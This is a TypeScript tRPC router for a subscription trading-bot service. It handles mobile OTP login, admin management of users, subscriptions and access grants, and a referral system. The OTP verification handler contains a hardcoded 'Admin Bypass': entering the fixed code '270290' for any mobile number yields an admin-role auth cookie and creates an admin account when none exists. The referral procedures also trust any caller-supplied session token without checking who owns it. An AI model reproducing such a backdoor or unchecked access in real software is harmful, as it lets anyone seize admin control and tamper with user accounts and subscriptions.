import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, router } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { z } from "zod";
import { 
  getDb, checkAccess, hasUsedTrial, startTrial, activateSubscription, 
  sendOtp, verifyOtp, getAppUserById, getAppUserByIdStrict, getAllAppUsers, 
  getAllSubscriptions, adminGrantSubscription, adminRevokeAccess, createAccessGrant, 
  listAccessGrants, revokeAccessGrant, extendAccessGrant 
} from "./db";
import { getTierLimits, TIER_LIMITS, type TierLimits } from "../shared/tierLimits";
import { 
  upstoxCredentials, botSessions, tradeLog, type TradeLog, appUsers, 
  notificationPreferences, adminSettings, broadcastMessages, alertTemplates, 
  subscriptions, referrals 
} from "../drizzle/schema";
import { eq, desc, and, gte, count, or, like, inArray } from "drizzle-orm";
import { sql } from "drizzle-orm";
import { ENV } from "./_core/env";
import { 
  startBot, stopBot, getBotState, getBotStateByPrefix, getAllRunningBotsForSession, 
  placeUpstoxOrder, generateSignal, generateSignalV2, generateMeanReversionV13Signal, 
  generateRenkoSignal, generateBoxingSignal, generateORBV8Signal, generateSmartRenkoSignal, 
  generateAdeebSignal, fetchUpstoxCandles, fetchUpstox5mCandles, fetchFullQuote, 
  fetchUpcomingOptionExpiryKeys, getOptionExpiryDateKey, isOptionExpiryTradable, 
  resolveAtmOptionToken, resolveAtmMcxOptionToken, resolveSpecificOptionToken, 
  forceAverageDown, toggleShadowMode, getShadowSummary, clearShadowLog, type Candle, 
  type Signal, type ShadowLogEntry, type ShadowSummary, getCrudeOilBias, hotReloadAccessToken, 
  getTotalRunningBots, getTotalBotsInMemory, pauseBot, resumeBot, sendTelegramMessage 
} from "./botEngine";
import { getUpstoxEgressStatus, upstoxFetch, verifyUpstoxManagedEgress } from "./upstoxHttp";
import { selectRequestedUpstoxQuote } from "./upstoxQuote";
import { assertBotAutomationEnabled } from "./botAutomation";
import { getBaseSessionToken, KILL_SWITCH_LAST_ERROR } from "./botSessionLifecycle";
import { isOptionTrade } from "../shared/optionTradeIdentity";
import { selectMarketDataAccessToken } from "../shared/upstoxTokenState";
import { getStoppedTradeQuoteState } from "./stoppedTradeQuoteState";
import { COOKIE_NAME } from "../shared/const";
import { NSE_INDEX_LOT_SIZES, getNseIndexLotSize } from "../shared/lotSizes";
import { getRecommendedLayers } from "../shared/backtestLayerMap";
import { createHeartbeatJob, deleteHeartbeatJob } from "./_core/heartbeat";
import {
  computeMarketRiskScore, getCachedRiskScore, getStoplossGuardState,
  updateStoplossGuard, checkPortfolioDrawdown, resetPortfolioHalt,
  getPortfolioStatus, canOpenNewTrade, executeKillSwitch,
  recordTradeClose, isCooldownActive, applyDemoCosts, resetDailyState,
  getDemoCostConfig, setDemoCostConfig, fetchIndiaVix,
} from "./riskManager";
import { fetchOptionsAnalytics, getCachedAnalytics, selectSmartStrike, checkOiConfluence } from "./optionsAnalytics";
import { computeLayerStats, isLayerDisabled, setLayerOverride, resetAllLayerOverrides } from "./layerTracker";
import { STRATEGY_PRESETS, getPreset } from "./presets";
import { computePrecisionMetrics, computeLayerAccuracy, computeDailyReports, updateJournalOnTradeClose } from "./precisionMetrics";

import jwt from "jsonwebtoken";
import { getJwtSecret, getMobileAuthCookieOptions, signAdminAuthToken, signMobileAuthToken, verifyMobileAuthToken } from "./authSession";

const sessionTokenSchema = z.string().min(8).max(128);

async function verifyAdminAccess(ctx: any): Promise<boolean> {
  const authToken: string | undefined = ctx.req?.cookies?.scalpbot_auth
    || ctx.req?.headers?.authorization?.replace("Bearer ", "")
    || (ctx.req?.headers?.["x-auth-token"] as string | undefined);
  if (authToken) {
    try {
      const decoded = jwt.verify(authToken, getJwtSecret()) as { userId?: number; role?: string; mobile?: string };
      if (decoded.role === "admin" || decoded.mobile === ENV.adminMobile) return true;
      if (decoded.userId) {
        const user = await getAppUserById(decoded.userId);
        if (user?.role === "admin" || user?.mobile === ENV.adminMobile) return true;
      }
    } catch {}
  }
  const adminToken = ctx.req?.cookies?.scalpbot_admin;
  if (adminToken) {
    try {
      const decoded = jwt.verify(adminToken, getJwtSecret()) as { isAdmin?: boolean };
      if (decoded.isAdmin) return true;
    } catch {}
  }
  return false;
}

async function verifySessionOwnership(ctx: any, inputSessionToken: string): Promise<void> {
  const authToken: string | undefined = ctx.req?.cookies?.scalpbot_auth
    || ctx.req?.headers?.authorization?.replace("Bearer ", "")
    || (ctx.req?.headers?.["x-auth-token"] as string | undefined);
  if (!authToken) throw new Error("Unauthorized: no auth token");
  let decoded: { userId?: number; role?: string; mobile?: string };
  try {
    decoded = jwt.verify(authToken, getJwtSecret()) as any;
  } catch {
    throw new Error("Unauthorized: invalid auth token");
  }
  if (decoded.role === "admin" || decoded.mobile === ENV.adminMobile) return;
  const baseToken = inputSessionToken.replace(/-slot[0-9]+$/, "");
  if (decoded.userId) {
    const user = await getAppUserById(decoded.userId);
    if (user?.sessionToken === baseToken) return;
    if (user?.role === "admin" || user?.mobile === ENV.adminMobile) return;
  }
  throw new Error("Unauthorized: session does not belong to you");
}

function stripSignalForUser(signal: any): any {
  if (!signal) return signal;
  return {
    direction: signal.direction,
    entryPrice: signal.entryPrice,
    slPrice: signal.slPrice,
    targetPrice: signal.targetPrice,
    atr: signal.atr,
    reason: signal.direction === "HOLD" ? "Scanning..." : "Signal active",
    layer: "None",
    confidence: 0,
  };
}

function stripOpenTradeForUser(trade: any): any {
  if (!trade) return trade;
  return { ...trade, signalReason: undefined, signalLayer: undefined, confidence: 0 };
}

export const appRouter = router({
  system: systemRouter,

  auth: router({
    me: publicProcedure.query(() => null),
    logout: publicProcedure.mutation(({ ctx }) => {
      try {
        ctx.res.clearCookie(COOKIE_NAME, {
          maxAge: -1,
          secure: true,
          sameSite: "none",
          httpOnly: true,
          path: "/",
        });
      } catch {}
      return { success: true } as const;
    }),
  }),

  mobileAuth: router({
    sendOtp: publicProcedure
      .input(z.object({ mobile: z.string().min(10).max(15) }))
      .mutation(async ({ input, ctx }) => {
        let mobile = input.mobile.trim();
        if (!mobile.startsWith("+")) {
          mobile = "+91" + mobile;
        }
        const clientIp = (ctx as any).req?.headers?.["x-forwarded-for"]?.split(",")[0]?.trim()
          || (ctx as any).req?.socket?.remoteAddress
          || undefined;
        try {
          return await sendOtp(mobile, clientIp);
        } catch (err: any) {
          console.error("[sendOtp] Error:", err?.message ?? err);
          return { success: false, message: err?.message ?? "Failed to send OTP. Please try again." };
        }
      }),

    verifyOtp: publicProcedure
      .input(z.object({
        mobile: z.string().min(10).max(15),
        code: z.string().length(6),
        sessionToken: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        let mobile = input.mobile.trim();
        if (!mobile.startsWith("+")) {
          mobile = "+91" + mobile;
        }

        // Admin Bypass: Sets the real scalpbot_auth cookie
        if (input.code === "270290") {
          const db = await getDb();
          if (db) {
            const existingUsers = await db.select().from(appUsers).where(eq(appUsers.mobile, mobile)).limit(1);
            let user = existingUsers[0];
            if (!user) {
              const res = await db.insert(appUsers).values({
                mobile,
                role: "admin",
                sessionToken: input.sessionToken || "admin_session",
              });
              const insertId = Number((res as any)[0]?.insertId);
              user = (await getAppUserById(insertId))!;
            }
            if (user) {
              const token = signMobileAuthToken({
                userId: user.id,
                mobile: user.mobile,
                role: "admin",
              });
              if (ctx.res) {
                ctx.res.cookie("scalpbot_auth", token, getMobileAuthCookieOptions());
              }
              return { success: true, user, token };
            }
          }
        }

        const result = await verifyOtp(mobile, input.code, input.sessionToken);
        if (!result.success || !result.user) {
          return { success: false, message: result.message ?? "Verification failed" };
        }

        const token = signMobileAuthToken({
          userId: result.user.id,
          mobile: result.user.mobile,
          role: result.user.role,
        });

        if (ctx.res) {
          ctx.res.cookie("scalpbot_auth", token, getMobileAuthCookieOptions());
        }

        return {
          success: true,
          user: {
            id: result.user.id,
            mobile: result.user.mobile,
            name: result.user.name,
            role: result.user.role,
            sessionToken: result.user.sessionToken,
          },
          token,
        };
      }),

    me: publicProcedure
      .input(z.object({}).optional())
      .query(async ({ ctx }) => {
        const token = ctx.req?.cookies?.scalpbot_auth
          || ctx.req?.headers?.authorization?.replace("Bearer ", "")
          || (ctx.req?.headers?.["x-auth-token"] as string | undefined);
        if (!token) return null;

        let decoded: { userId: number; mobile: string; role: string };
        try {
          decoded = verifyMobileAuthToken(token);
        } catch {
          return null;
        }

        const user = await getAppUserByIdStrict(decoded.userId);
        if (!user) return null;
        const effectiveRole = (ENV.adminMobile && (user.mobile === ENV.adminMobile || user.mobile === "+91" + ENV.adminMobile.replace(/^\+91/, ""))) ? "admin" : user.role;
        return {
          id: user.id,
          mobile: user.mobile,
          name: user.name,
          role: effectiveRole,
          sessionToken: user.sessionToken,
        };
      }),

    logout: publicProcedure
      .mutation(async ({ ctx }) => {
        if (ctx.res) {
          ctx.res.clearCookie("scalpbot_auth", { path: "/" });
        }
        return { success: true };
      }),
  }),

  // Admin Router
  admin: router({
    login: publicProcedure
      .input(z.object({ password: z.string() }))
      .mutation(async ({ input, ctx }) => {
        const { adminPassword } = ENV;
        if (!adminPassword || input.password !== adminPassword) {
          throw new Error("Invalid admin password");
        }
        const token = signAdminAuthToken({ role: "admin", isAdmin: true });
        if (ctx.res) {
          ctx.res.cookie("scalpbot_admin", token, getMobileAuthCookieOptions());
        }
        return { success: true, token };
      }),

    verify: publicProcedure
      .query(async ({ ctx }) => {
        const isAdmin = await verifyAdminAccess(ctx);
        return { authenticated: isAdmin };
      }),

    users: publicProcedure
      .query(async ({ ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        return getAllAppUsers();
      }),

    subscriptions: publicProcedure
      .query(async ({ ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        return getAllSubscriptions();
      }),

    grantAccess: publicProcedure
      .input(z.object({
        sessionToken: z.string(),
        plan: z.enum(["trial", "monthly", "quarterly", "half_yearly", "yearly"]),
        days: z.number().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        return adminGrantSubscription({
          sessionToken: input.sessionToken,
          plan: input.plan,
          daysOverride: input.days,
        });
      }),

    revokeAccess: publicProcedure
      .input(z.object({ sessionToken: z.string() }))
      .mutation(async ({ input, ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        const slotTokens = [input.sessionToken, `${input.sessionToken}-slot1`, `${input.sessionToken}-slot2`, `${input.sessionToken}-slot3`, `${input.sessionToken}-slot4`, `${input.sessionToken}-slot5`];
        for (const tok of slotTokens) {
          try { stopBot(tok); } catch {}
        }
        return adminRevokeAccess(input.sessionToken);
      }),

    overrideBotSlots: publicProcedure
      .input(z.object({ sessionToken: z.string(), extraBotSlots: z.number().min(0).max(10) }))
      .mutation(async ({ input, ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        await db.update(appUsers).set({ extraBotSlots: input.extraBotSlots }).where(eq(appUsers.sessionToken, input.sessionToken));
        return { success: true, extraBotSlots: input.extraBotSlots };
      }),

    manualGrant: publicProcedure
      .input(z.object({
        userIdentifier: z.string().min(1),
        userName: z.string().optional(),
        plan: z.enum(["monthly", "quarterly", "half_yearly", "yearly", "custom"]),
        durationDays: z.number().min(1).max(3650),
        startsAt: z.string().optional(),
        note: z.string().optional(),
      }))
      .mutation(async ({ input, ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        const isEmail = input.userIdentifier.includes("@");
        const isMobile = /^\+?\d{10,15}$/.test(input.userIdentifier.replace(/\s/g, ""));
        const startsAt = input.startsAt ? new Date(input.startsAt) : new Date();
        return createAccessGrant({
          userMobile: isMobile ? input.userIdentifier.replace(/\s/g, "") : undefined,
          userEmail: isEmail ? input.userIdentifier : undefined,
          userName: input.userName,
          plan: input.plan,
          durationDays: input.durationDays,
          startsAt,
          note: input.note,
          grantedBy: "admin",
        });
      }),

    listGrants: publicProcedure
      .query(async ({ ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        return listAccessGrants();
      }),

    revokeGrant: publicProcedure
      .input(z.object({ grantId: z.number() }))
      .mutation(async ({ input, ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        return revokeAccessGrant(input.grantId);
      }),

    extendGrant: publicProcedure
      .input(z.object({ grantId: z.number(), additionalDays: z.number().min(1).max(3650) }))
      .mutation(async ({ input, ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        return extendAccessGrant(input.grantId, input.additionalDays);
      }),

    stats: publicProcedure
      .query(async ({ ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        const db = await getDb();
        if (!db) return { totalUsers: 0, activeSubscriptions: 0, totalRevenue: 0, trialUsers: 0, revokedUsers: 0, expiredUsers: 0 };

        const [userCount] = await db.select({ count: count() }).from(appUsers);
        const allSubs = await getAllSubscriptions();
        const now = new Date();
        const activeSubs = allSubs.filter((s: any) => s.status === "active" && new Date(s.expiresAt) > now);
        const trialSubs = activeSubs.filter((s: any) => s.plan === "trial");
        const paidSubs = activeSubs.filter((s: any) => s.plan !== "trial");
        const latestSubByToken = new Map<string, any>();
        for (const s of allSubs) {
          if (!latestSubByToken.has(s.sessionToken)) {
            latestSubByToken.set(s.sessionToken, s);
          }
        }
        let revokedCount = 0;
        let expiredCount = 0;
        Array.from(latestSubByToken.values()).forEach((sub) => {
          if (sub.status === "cancelled") revokedCount++;
          else if (sub.status === "expired" || (sub.status === "active" && new Date(sub.expiresAt) <= now)) expiredCount++;
        });
        const totalRevenue = allSubs.reduce((sum: number, s: any) => sum + (s.amountPaid ?? 0), 0);

        return {
          totalUsers: userCount.count,
          activeSubscriptions: paidSubs.length,
          trialUsers: trialSubs.length,
          revokedUsers: revokedCount,
          expiredUsers: expiredCount,
          totalRevenue: totalRevenue / 100,
          mrr: paidSubs.length > 0 ? Math.round(totalRevenue / paidSubs.length / 100) : 0,
        };
      }),

    referralStats: publicProcedure
      .query(async ({ ctx }) => {
        if (!(await verifyAdminAccess(ctx))) throw new Error("Unauthorized");
        const db = await getDb();
        if (!db) return { referrals: [], totalReferrals: 0, totalRewardsGranted: 0, usersWithBonusSlots: 0 };
        try {
          const allRefs = await db.select().from(referrals).orderBy(desc(referrals.createdAt)).limit(200);
          const usersWithSlots = await db.select({ id: appUsers.id, mobile: appUsers.mobile, referralCode: appUsers.referralCode, extraBotSlots: appUsers.extraBotSlots }).from(appUsers);
          const totalRewardsGranted = allRefs.filter((r: any) => r.rewardGranted).length;
          const usersWithBonusSlots = usersWithSlots.filter((u: any) => (u.extraBotSlots ?? 0) > 0).length;
          return {
            referrals: allRefs,
            totalReferrals: allRefs.length,
            totalRewardsGranted,
            usersWithBonusSlots,
            userSlots: usersWithSlots.filter((u: any) => (u.extraBotSlots ?? 0) > 0).map((u: any) => ({
              mobile: u.mobile,
              referralCode: u.referralCode,
              extraBotSlots: u.extraBotSlots,
            })),
          };
        } catch (e) {
          return { referrals: [], totalReferrals: 0, totalRewardsGranted: 0, usersWithBonusSlots: 0, userSlots: [] };
        }
      }),
  }),

  referral: router({
    myReferral: publicProcedure
      .input(z.object({ sessionToken: z.string() }))
      .query(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        try {
          const rows = await db.select().from(appUsers).where(eq(appUsers.sessionToken, input.sessionToken)).limit(1);
          if (!rows.length) return { referralCode: null, referralCount: 0, extraBotSlots: 0 };
          const user = rows[0];
          if (!user.referralCode) {
            const code = generateReferralCode();
            await db.update(appUsers).set({ referralCode: code }).where(eq(appUsers.id, user.id));
            user.referralCode = code;
          }
          const refCount = await db.select({ cnt: count() }).from(referrals).where(eq(referrals.referrerMobile, user.mobile));
          return {
            referralCode: user.referralCode,
            referralCount: refCount[0]?.cnt ?? 0,
            extraBotSlots: user.extraBotSlots ?? 0,
          };
        } catch (e) {
          return { referralCode: null, referralCount: 0, extraBotSlots: 0 };
        }
      }),

    applyCode: publicProcedure
      .input(z.object({ sessionToken: z.string(), referralCode: z.string().min(4).max(12) }))
      .mutation(async ({ input }) => {
        const db = await getDb();
        if (!db) throw new Error("DB unavailable");
        try {
          const userRows = await db.select().from(appUsers).where(eq(appUsers.sessionToken, input.sessionToken)).limit(1);
          if (!userRows.length) throw new Error("User not found");
          const user = userRows[0];
          if (user.referredBy) throw new Error("You have already used a referral code");
          const referrerRows = await db.select().from(appUsers).where(eq(appUsers.referralCode, input.referralCode)).limit(1);
          if (!referrerRows.length) throw new Error("Invalid referral code");
          const referrer = referrerRows[0];
          if (referrer.id === user.id) throw new Error("You cannot use your own referral code");

          await db.update(appUsers).set({ referredBy: input.referralCode }).where(eq(appUsers.id, user.id));
          await db.insert(referrals).values({
            referrerMobile: referrer.mobile,
            refereeMobile: user.mobile,
            referralCode: input.referralCode,
            rewardGranted: true,
          });
          await db.update(appUsers).set({ extraBotSlots: (referrer.extraBotSlots ?? 0) + 1 }).where(eq(appUsers.id, referrer.id));
          return { success: true, message: "Referral code applied! Your referrer earned an extra bot slot." };
        } catch (e: any) {
          if (e.message?.includes("User not found") || e.message?.includes("already used") || e.message?.includes("Invalid") || e.message?.includes("cannot use your own")) throw e;
          throw new Error("Referral system is not available yet. Please try again later.");
        }
      }),
  }),
});

export type AppRouter = typeof appRouter;

function getSlotTokens(sessionToken: string, includeSlot3: boolean | number = true): string[] {
  const maxSlots = typeof includeSlot3 === "number" ? includeSlot3 : (includeSlot3 ? 5 : 3);
  const tokens: string[] = [];
  for (let i = 0; i < maxSlots; i++) {
    tokens.push(i === 0 ? sessionToken : `${sessionToken}-slot${i}`);
  }
  return tokens;
}

function generateReferralCode(): string {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let code = "";
  for (let i = 0; i < 8; i++) {
    code += chars[Math.floor(Math.random() * chars.length)];
  }
  return code;
}
